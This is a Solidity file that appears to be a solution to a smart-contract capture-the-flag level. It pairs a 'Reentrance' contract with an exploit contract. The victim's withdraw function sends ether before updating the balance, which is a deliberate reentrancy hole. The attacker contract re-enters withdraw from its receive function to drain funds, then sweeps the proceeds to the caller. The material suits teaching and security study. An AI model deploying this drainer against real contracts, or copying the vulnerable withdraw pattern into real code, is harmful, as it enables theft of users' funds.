// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "hardhat/console.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract TestReentrance {

    Reentrance r;

    constructor(address _r) {
        r = Reentrance(payable(_r));
    }

    receive() external payable {
        if(address(msg.sender).balance >= 0.001 ether){
            r.withdraw(0.001 ether);
        }
    }

    function attack() public {
        r.withdraw(0.001 ether);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

}